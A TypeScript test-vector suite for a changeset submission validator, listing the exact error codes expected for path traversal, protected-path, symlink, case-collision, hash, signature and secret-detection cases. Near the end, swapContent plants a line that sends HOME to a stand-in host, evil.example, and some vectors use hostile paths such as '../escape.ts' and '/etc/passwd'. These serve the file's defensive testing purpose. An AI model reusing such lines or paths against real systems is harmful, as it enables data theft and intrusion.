/**
 * The shared changeset vector suite (WORKSTREAMS.md verification DONE 1, SECURITY.md S-16/S-17/S-26).
 *
 * Exported so every place that validates a submission runs the SAME cases: this package's unit tests,
 * the control plane's `POST /v1/leases/:id/changeset` tests (expect 422 with exactly `codes`), the
 * orchestrator's pre-submit check and CI's scope step. Each vector names the exact set of error codes
 * it must produce, so a validator that reports the right code for the wrong reason also fails.
 *
 * Deterministic: fixed Ed25519 seed (Ed25519 signatures are deterministic), no clock, no randomness.
 */
import { createPrivateKey, createPublicKey, sign } from "node:crypto";
import type { AbuSpec, Changeset, ChangesetErrorCode, ChangesetFile, RepoManifest } from "@waronsaas/contracts";
import { changesetSigningPayload, computeSubmissionSha256, type ScopeContext, type SubmissionContext, sha256Hex } from "./index.js";

export interface ChangesetVector {
  name: string;
  changeset: Changeset;
  ctx: ScopeContext;
  server: SubmissionContext;
  /** Exact set of codes (sorted, unique) from `validateSubmission`; empty = must be accepted. */
  codes: ChangesetErrorCode[];
}

const PARENT = "a".repeat(40);
const OTHER_SHA = "b".repeat(40);
const MANIFEST_SHA = `sha256:${"1".repeat(64)}`;
const IDS = {
  taskId: "0192ab3c-0000-7000-8000-000000000001",
  leaseId: "0192ab3c-0000-7000-8000-000000000002",
  deviceId: "0192ab3c-0000-7000-8000-000000000003",
};

const PKCS8_ED25519_PREFIX = Buffer.from("302e020100300506032b657004220420", "hex");
const keyFromSeed = (seedByte: number) =>
  createPrivateKey({ key: Buffer.concat([PKCS8_ED25519_PREFIX, Buffer.alloc(32, seedByte)]), format: "der", type: "pkcs8" });
export const VECTOR_DEVICE_KEY = keyFromSeed(7);
const WRONG_DEVICE_KEY = keyFromSeed(9);
/** base64 of the raw 32-byte public key: the registered device key used by every vector. */
export const VECTOR_DEVICE_PUBLIC_KEY = (createPublicKey(VECTOR_DEVICE_KEY).export({ format: "der", type: "spki" }) as Buffer)
  .subarray(-32)
  .toString("base64");

export const vectorManifest = (over: Partial<RepoManifest> = {}): RepoManifest => ({
  schema: "wos-repo.v1",
  displayName: "warOnSaaS suite",
  products: [],
  defaultBranch: "main",
  stack: { language: "typescript", runtime: "node", packageManager: "npm" },
  install: ["npm", "ci", "--ignore-scripts"],
  verify: [{ id: "test", run: ["npm", "test"], timeoutSeconds: 600 }],
  protectedPaths: [".github/**", "wos.json", "catalog/**", "roadmaps/**", "features/**"],
  lockfiles: ["package-lock.json"],
  generatedPaths: ["modules/contacts/dist/**"],
  migrationsDir: "db/migrations",
  maxChangesetBytes: 4_000_000,
  ...over,
});

export const vectorAbu = (over: Partial<AbuSpec> = {}): AbuSpec => ({
  key: "contacts#04",
  title: "Contacts list endpoint",
  objective: "Add the paginated contacts list endpoint with its tests.",
  requirements: ["R-001"],
  dependsOn: [],
  sizePoints: 2,
  scope: { write: ["modules/contacts/**"], read: [] },
  resources: [],
  acceptance: { checks: [{ id: "unit", run: ["npm", "test"] }], tests: [] },
  ...over,
});

export const EXISTING_PATHS: readonly string[] = [
  "wos.json",
  "package.json",
  "package-lock.json",
  ".github/workflows/wos-verify.yml",
  "modules/contacts/README.md",
  "modules/contacts/Api/handler.ts",
  "modules/contacts/café.ts",
  "modules/contacts/list.ts",
  "roadmaps/salesforce/ROADMAP.yaml",
];

export type UpsertFile = Extract<ChangesetFile, { op: "upsert" }>;
export const upsert = (path: string, text: string, mode: "100644" | "100755" = "100644"): UpsertFile => {
  const bytes = Buffer.from(text, "utf8");
  return { op: "upsert", path, mode, contentBase64: bytes.toString("base64"), sha256: sha256Hex(bytes), bytes: bytes.length };
};
export const del = (path: string): ChangesetFile => ({ op: "delete", path });

/** Builds a correctly hashed and signed changeset; `tamper` runs after signing (a modified client). */
export function signedChangeset(
  files: ChangesetFile[],
  opts: {
    parent?: string;
    key?: typeof VECTOR_DEVICE_KEY;
    tamper?: (c: Changeset) => void;
    manifestSha256?: string;
    ids?: { taskId: string; leaseId: string; deviceId: string };
  } = {},
): Changeset {
  const parent = opts.parent ?? PARENT;
  const c: Changeset = {
    schema: "wos-changeset.v1",
    ...(opts.ids ?? IDS),
    parentCommit: parent,
    manifestSha256: opts.manifestSha256 ?? MANIFEST_SHA,
    submissionSha256: computeSubmissionSha256(parent, files),
    files,
    summary: {
      schema: "build-summary.v1",
      summary: "Adds the list endpoint.",
      requirementsCovered: ["R-001"],
      responses: [],
      abuConcerns: [],
    },
    localVerification: [],
    signature: "",
  };
  c.signature = sign(null, Buffer.from(changesetSigningPayload(c), "utf8"), opts.key ?? VECTOR_DEVICE_KEY).toString("base64");
  opts.tamper?.(c);
  return c;
}

const abuCtx = (over: { abu?: Partial<AbuSpec>; manifest?: Partial<RepoManifest>; existing?: readonly string[] } = {}): ScopeContext => ({
  kind: "abu",
  abu: vectorAbu(over.abu),
  documentPaths: [],
  repoManifest: vectorManifest(over.manifest),
  existingPaths: new Set(over.existing ?? EXISTING_PATHS),
});
const roadmapCtx = (): ScopeContext => ({
  kind: "roadmap",
  abu: null,
  documentPaths: ["roadmaps/salesforce/ROADMAP.yaml", "roadmaps/salesforce/INVENTORY.yaml"],
  repoManifest: vectorManifest(),
  existingPaths: new Set(EXISTING_PATHS),
});
const server: SubmissionContext = {
  expectedParentCommit: PARENT,
  acceptedManifestSha256: MANIFEST_SHA,
  devicePublicKey: VECTOR_DEVICE_PUBLIC_KEY,
};
const ok = upsert("modules/contacts/list-endpoint.ts", "export const list = () => [];\n");

// Secret fixtures are assembled at run time so this source file does not trip the repo's own secret scan.
const FAKE_AWS_KEY = ["AK", "IA", "Q3EGQVT2", "XK7M4ZPB"].join("");
const FAKE_PRIVATE_KEY = ["-----BEGIN ", "OPENSSH PRIVATE KEY", "-----\nb3BlbnNzaC1rZXktdjEAAAAA\n"].join("");

type V = Omit<ChangesetVector, "server"> & { server?: SubmissionContext };
const v = (
  name: string,
  codes: ChangesetErrorCode[],
  changeset: Changeset,
  ctx: ScopeContext = abuCtx(),
  s: SubmissionContext = server,
): V => ({
  name,
  codes: [...new Set(codes)].sort(),
  changeset,
  ctx,
  server: s,
});

export function changesetVectors(): ChangesetVector[] {
  const list: V[] = [
    // -- accepted -------------------------------------------------------------------------------
    v("accepts a new file inside the write scope", [], signedChangeset([ok])),
    v("accepts an executable file", [], signedChangeset([upsert("modules/contacts/bin/run.sh", "#!/bin/sh\n", "100755")])),
    v("accepts a delete of an existing in-scope file", [], signedChangeset([del("modules/contacts/list.ts")])),
    v(
      "accepts a case-only rename done as delete + upsert",
      [],
      signedChangeset([del("modules/contacts/README.md"), upsert("modules/contacts/readme.md", "# Contacts\n")]),
    ),
    v(
      "accepts the lockfile with an exclusive lockfile resource",
      [],
      signedChangeset([upsert("package-lock.json", "{}\n")]),
      abuCtx({
        abu: {
          scope: { write: ["modules/contacts/**", "package-lock.json"], read: [] },
          resources: [{ key: "lockfile:package-lock.json", mode: "exclusive" }],
        },
      }),
    ),
    v(
      "accepts a migration with an exclusive db:migrations resource",
      [],
      signedChangeset([upsert("db/migrations/contacts_04__list.sql", "select 1;\n")]),
      abuCtx({ abu: { scope: { write: ["db/migrations/**"], read: [] }, resources: [{ key: "db:migrations", mode: "exclusive" }] } }),
    ),
    v(
      "accepts a roadmap author writing their own roadmap under protected roadmaps/**",
      [],
      signedChangeset([upsert("roadmaps/salesforce/ROADMAP.yaml", "schema: wos-roadmap.v1\n")]),
      roadmapCtx(),
    ),

    // -- PATH_INVALID, including `..` tricks ---------------------------------------------------------
    v("PATH_INVALID: leading ..", ["PATH_INVALID"], signedChangeset([upsert("../escape.ts", "x")])),
    v(
      "PATH_INVALID: .. in the middle climbing out of scope",
      ["PATH_INVALID"],
      signedChangeset([upsert("modules/contacts/../../.github/workflows/x.yml", "x")]),
    ),
    v("PATH_INVALID: trailing ..", ["PATH_INVALID"], signedChangeset([upsert("modules/contacts/..", "x")])),
    v("PATH_INVALID: absolute path", ["PATH_INVALID"], signedChangeset([upsert("/etc/passwd", "x")])),
    v("PATH_INVALID: backslash separators", ["PATH_INVALID"], signedChangeset([upsert("modules\\contacts\\..\\..\\wos.json", "x")])),
    v("PATH_INVALID: . segment", ["PATH_INVALID"], signedChangeset([upsert("modules/contacts/./list.ts", "x")])),
    v("PATH_INVALID: empty segment", ["PATH_INVALID"], signedChangeset([upsert("modules/contacts//list.ts", "x")])),
    v("PATH_INVALID: NUL byte", ["PATH_INVALID"], signedChangeset([upsert("modules/contacts/a\u0000.ts", "x")])),
    v("PATH_INVALID: .git segment", ["PATH_INVALID"], signedChangeset([upsert("modules/contacts/.git/hooks/pre-commit", "x")])),
    v("PATH_INVALID: .GIT in another case", ["PATH_INVALID"], signedChangeset([upsert(".GIT/config", "x")])),
    v(
      "PATH_INVALID: .git. with trailing dot (Windows alias)",
      ["PATH_INVALID"],
      signedChangeset([upsert("modules/contacts/.git./config", "x")]),
    ),
    v("PATH_INVALID: GIT~1 (8.3 alias of .git)", ["PATH_INVALID"], signedChangeset([upsert("GIT~1/config", "x")])),
    v(
      "PATH_INVALID: right-to-left override hides the extension",
      ["PATH_INVALID"],
      signedChangeset([upsert("modules/contacts/list‮st.ts", "x")]),
    ),
    v("PATH_INVALID: Windows device name", ["PATH_INVALID"], signedChangeset([upsert("modules/contacts/con.ts", "x")])),
    v("PATH_INVALID: NTFS alternate data stream", ["PATH_INVALID"], signedChangeset([upsert("modules/contacts/list.ts:hidden", "x")])),
    v(
      "PATH_INVALID: a file replacing a directory that has files",
      ["PATH_INVALID"],
      signedChangeset([upsert("modules/contacts/Api", "x")]),
    ),
    v("PATH_INVALID: a file under an existing file", ["PATH_INVALID"], signedChangeset([upsert("modules/contacts/list.ts/inner.ts", "x")])),

    // -- OUT_OF_SCOPE -------------------------------------------------------------------------------
    v("OUT_OF_SCOPE: another feature's module", ["OUT_OF_SCOPE"], signedChangeset([upsert("modules/billing/x.ts", "x")])),
    v("OUT_OF_SCOPE: sibling directory sharing the prefix", ["OUT_OF_SCOPE"], signedChangeset([upsert("modules/contacts-evil/x.ts", "x")])),
    v("OUT_OF_SCOPE: delete outside scope", ["OUT_OF_SCOPE"], signedChangeset([del("package.json")])),
    v("OUT_OF_SCOPE: ABU missing from an abu context fails closed", ["OUT_OF_SCOPE"], signedChangeset([ok]), { ...abuCtx(), abu: null }),
    v(
      "OUT_OF_SCOPE: roadmap author writing another app's roadmap",
      ["OUT_OF_SCOPE", "PROTECTED_PATH"],
      signedChangeset([upsert("roadmaps/slack/ROADMAP.yaml", "x")]),
      roadmapCtx(),
    ),

    // -- PROTECTED_PATH / WORKFLOW_FILE ---------------------------------------------------------------
    v(
      "PROTECTED_PATH: wos.json even when the ABU scope (a bad graph) includes it",
      ["PROTECTED_PATH"],
      signedChangeset([upsert("wos.json", "{}")]),
      abuCtx({ abu: { scope: { write: ["modules/contacts/**", "wos.json"], read: [] } } }),
    ),
    v(
      "PROTECTED_PATH: .github/** even when the manifest forgets it",
      ["PROTECTED_PATH"],
      signedChangeset([upsert(".github/CODEOWNERS", "* @x")]),
      abuCtx({ abu: { scope: { write: [".github/**"], read: [] } }, manifest: { protectedPaths: ["catalog/**", "features/**"] } }),
    ),
    v(
      "PROTECTED_PATH: a builder writing a feature contract",
      ["PROTECTED_PATH"],
      signedChangeset([upsert("features/contacts/CONTRACT.yaml", "x")]),
      abuCtx({ abu: { scope: { write: ["features/contacts/**"], read: [] } } }),
    ),
    v(
      "PROTECTED_PATH: .gitattributes inside the scope",
      ["PROTECTED_PATH"],
      signedChangeset([upsert("modules/contacts/.gitattributes", "* filter=evil")]),
    ),
    v(
      "PROTECTED_PATH: .gitmodules inside the scope",
      ["PROTECTED_PATH"],
      signedChangeset([upsert("modules/contacts/.gitmodules", "[submodule]")]),
    ),
    v(
      "PROTECTED_PATH: a document author may never write wos.json",
      ["OUT_OF_SCOPE", "PROTECTED_PATH"],
      signedChangeset([upsert("wos.json", "{}")]),
      roadmapCtx(),
    ),
    v(
      "WORKFLOW_FILE: .github/workflows",
      ["WORKFLOW_FILE"],
      signedChangeset([upsert(".github/workflows/evil.yml", "on: push")]),
      abuCtx({ abu: { scope: { write: [".github/**"], read: [] } } }),
    ),
    v(
      "WORKFLOW_FILE: case variant .GitHub/Workflows",
      ["WORKFLOW_FILE"],
      signedChangeset([upsert(".GitHub/Workflows/evil.yml", "on: push")], {}),
      abuCtx({ abu: { scope: { write: [".GitHub/**"], read: [] } }, existing: EXISTING_PATHS.filter((p) => !p.startsWith(".github/")) }),
    ),
    v(
      "WORKFLOW_FILE: deleting the verify workflow",
      ["WORKFLOW_FILE"],
      signedChangeset([del(".github/workflows/wos-verify.yml")]),
      abuCtx({ abu: { scope: { write: [".github/**"], read: [] } } }),
    ),
    v(
      "WORKFLOW_FILE: a file taking the place of the workflows directory",
      ["WORKFLOW_FILE"],
      signedChangeset([upsert(".github/workflows", "x")]),
      abuCtx({ abu: { scope: { write: [".github/**"], read: [] } }, existing: EXISTING_PATHS.filter((p) => !p.startsWith(".github/")) }),
    ),

    // -- GENERATED_PATH -----------------------------------------------------------------------------
    v(
      "GENERATED_PATH: build output inside the scope",
      ["GENERATED_PATH"],
      signedChangeset([upsert("modules/contacts/dist/index.js", "x")]),
    ),

    // -- LOCKFILE_WITHOUT_RESOURCE / MIGRATION_WITHOUT_RESOURCE ---------------------------------------
    v(
      "LOCKFILE_WITHOUT_RESOURCE: root lockfile in scope, no resource",
      ["LOCKFILE_WITHOUT_RESOURCE"],
      signedChangeset([upsert("package-lock.json", "{}\n")]),
      abuCtx({ abu: { scope: { write: ["modules/contacts/**", "package-lock.json"], read: [] } } }),
    ),
    v(
      "LOCKFILE_WITHOUT_RESOURCE: shared (not exclusive) lockfile resource",
      ["LOCKFILE_WITHOUT_RESOURCE"],
      signedChangeset([upsert("package-lock.json", "{}\n")]),
      abuCtx({
        abu: { scope: { write: ["package-lock.json"], read: [] }, resources: [{ key: "lockfile:package-lock.json", mode: "shared" }] },
      }),
    ),
    v(
      "LOCKFILE_WITHOUT_RESOURCE: nested lockfile not listed in wos.json",
      ["LOCKFILE_WITHOUT_RESOURCE"],
      signedChangeset([upsert("modules/contacts/package-lock.json", "{}")]),
    ),
    v(
      "MIGRATION_WITHOUT_RESOURCE: migration in scope, no resource",
      ["MIGRATION_WITHOUT_RESOURCE"],
      signedChangeset([upsert("db/migrations/contacts_04__list.sql", "drop table x;")]),
      abuCtx({ abu: { scope: { write: ["db/**"], read: [] } } }),
    ),
    v(
      "MIGRATION_WITHOUT_RESOURCE: case variant of the migrations dir",
      ["MIGRATION_WITHOUT_RESOURCE"],
      signedChangeset([upsert("DB/Migrations/contacts_04__list.sql", "drop table x;")]),
      abuCtx({ abu: { scope: { write: ["DB/**"], read: [] } } }),
    ),

    // -- SYMLINK_OR_SPECIAL_FILE (a modified client bypassing the schema) ------------------------------
    ...(["120000", "160000", "040000"] as const).map((mode) =>
      v(
        `SYMLINK_OR_SPECIAL_FILE: mode ${mode}`,
        ["SYMLINK_OR_SPECIAL_FILE"],
        signedChangeset([{ ...upsert("modules/contacts/link", "/etc/passwd"), mode } as unknown as ChangesetFile]),
      ),
    ),

    // -- CASE_COLLISION -----------------------------------------------------------------------------
    v(
      "CASE_COLLISION: new file equal to an existing one ignoring case",
      ["CASE_COLLISION"],
      signedChangeset([upsert("modules/contacts/readme.md", "x")]),
    ),
    v("CASE_COLLISION: directory differs only in case", ["CASE_COLLISION"], signedChangeset([upsert("modules/contacts/api/new.ts", "x")])),
    v(
      "CASE_COLLISION: NFD spelling of an existing NFC name",
      ["CASE_COLLISION"],
      signedChangeset([upsert("modules/contacts/café.ts", "x")]),
    ),
    v(
      "CASE_COLLISION: two new files in one changeset",
      ["CASE_COLLISION"],
      signedChangeset([upsert("modules/contacts/New.ts", "x"), upsert("modules/contacts/new.ts", "y")]),
    ),
    v(
      "CASE_COLLISION: German sharp s folds to ss",
      ["CASE_COLLISION"],
      signedChangeset([upsert("modules/contacts/straße.ts", "x"), upsert("modules/contacts/STRASSE.ts", "y")]),
    ),
    v("CASE_COLLISION: same path listed twice", ["CASE_COLLISION"], signedChangeset([ok, ok])),

    // -- HASH_MISMATCH / SUBMISSION_HASH_MISMATCH ------------------------------------------------------
    v(
      "HASH_MISMATCH: sha256 does not match content",
      ["HASH_MISMATCH"],
      signedChangeset([{ ...ok, sha256: sha256Hex("other") } as ChangesetFile]),
    ),
    v("HASH_MISMATCH: byte count lies", ["HASH_MISMATCH"], signedChangeset([{ ...ok, bytes: 1 } as ChangesetFile])),
    v(
      "HASH_MISMATCH: non-canonical base64",
      ["HASH_MISMATCH"],
      signedChangeset([{ ...ok, contentBase64: `${(ok as { contentBase64: string }).contentBase64}\n` } as ChangesetFile]),
    ),
    v(
      "SUBMISSION_HASH_MISMATCH: a file added after the diff hash was computed",
      ["SIGNATURE_INVALID", "SUBMISSION_HASH_MISMATCH"],
      signedChangeset([ok], { tamper: (c) => c.files.push(upsert("modules/contacts/extra.ts", "x")) }),
    ),
    v(
      "SUBMISSION_HASH_MISMATCH: diff hash from another submission (re-signed by the device)",
      ["SUBMISSION_HASH_MISMATCH"],
      (() => {
        const c = signedChangeset([ok]);
        const other = signedChangeset([upsert("modules/contacts/other.ts", "y")]);
        return signedChangeset(c.files, { tamper: (x) => resign(x, other.submissionSha256) });
      })(),
    ),

    // -- server-only: PARENT_MISMATCH / MANIFEST_MISMATCH / SIGNATURE_INVALID ----------------------------
    v("PARENT_MISMATCH: submission built on another commit", ["PARENT_MISMATCH"], signedChangeset([ok], { parent: OTHER_SHA })),
    v(
      "MANIFEST_MISMATCH: manifest not accepted for this lease",
      ["MANIFEST_MISMATCH"],
      signedChangeset([ok], { tamper: (c) => resign(c, c.submissionSha256, `sha256:${"9".repeat(64)}`) }),
    ),
    v("SIGNATURE_INVALID: signed by another device's key", ["SIGNATURE_INVALID"], signedChangeset([ok], { key: WRONG_DEVICE_KEY })),
    v(
      "SIGNATURE_INVALID: content swapped after signing with hashes fixed up",
      ["SIGNATURE_INVALID"],
      signedChangeset([ok], { tamper: swapContent }),
    ),
    v(
      "SIGNATURE_INVALID: summary edited after signing",
      ["SIGNATURE_INVALID"],
      signedChangeset([ok], {
        tamper: (c) => {
          c.summary.summary = "all tests passed";
        },
      }),
    ),
    v(
      "SIGNATURE_INVALID: garbage signature",
      ["SIGNATURE_INVALID"],
      signedChangeset([ok], {
        tamper: (c) => {
          c.signature = "not-base64!";
        },
      }),
    ),

    // -- TOO_LARGE ----------------------------------------------------------------------------------
    v(
      "TOO_LARGE: over wos.json maxChangesetBytes",
      ["TOO_LARGE"],
      signedChangeset([upsert("modules/contacts/big.txt", "x".repeat(2_001))]),
      abuCtx({ manifest: { maxChangesetBytes: 2_000 } }),
    ),
    v(
      "TOO_LARGE: more than 500 files",
      ["TOO_LARGE"],
      signedChangeset(Array.from({ length: 501 }, (_, i) => upsert(`modules/contacts/f${String(i).padStart(3, "0")}.ts`, "x"))),
    ),

    // -- SECRET_DETECTED ----------------------------------------------------------------------------
    v(
      "SECRET_DETECTED: AWS access key id",
      ["SECRET_DETECTED"],
      signedChangeset([upsert("modules/contacts/config.ts", `export const key = "${FAKE_AWS_KEY}";\n`)]),
    ),
    v(
      "SECRET_DETECTED: private key block",
      ["SECRET_DETECTED"],
      signedChangeset([upsert("modules/contacts/id_ed25519", FAKE_PRIVATE_KEY)]),
    ),

    // -- DELETE_MISSING_FILE / EMPTY_DIFF --------------------------------------------------------------
    v("DELETE_MISSING_FILE: delete of an absent path", ["DELETE_MISSING_FILE"], signedChangeset([del("modules/contacts/ghost.ts")])),
    v("EMPTY_DIFF: no files", ["EMPTY_DIFF"], signedChangeset([])),
  ];
  return list.map((x) => ({ ...x, server: x.server ?? server }));
}

/** A modified client that re-signs with the real device key after changing hash fields. */
function resign(c: Changeset, submissionSha256: string, manifestSha256 = c.manifestSha256) {
  c.submissionSha256 = submissionSha256;
  c.manifestSha256 = manifestSha256;
  c.signature = sign(null, Buffer.from(changesetSigningPayload(c), "utf8"), VECTOR_DEVICE_KEY).toString("base64");
}

/** A man-in-the-middle (or a later edit) swaps content and recomputes every hash, but cannot re-sign. */
function swapContent(c: Changeset) {
  const evil = upsert("modules/contacts/list-endpoint.ts", "fetch('https://evil.example/' + process.env.HOME);\n");
  c.files = [evil];
  c.submissionSha256 = computeSubmissionSha256(c.parentCommit, c.files);
}
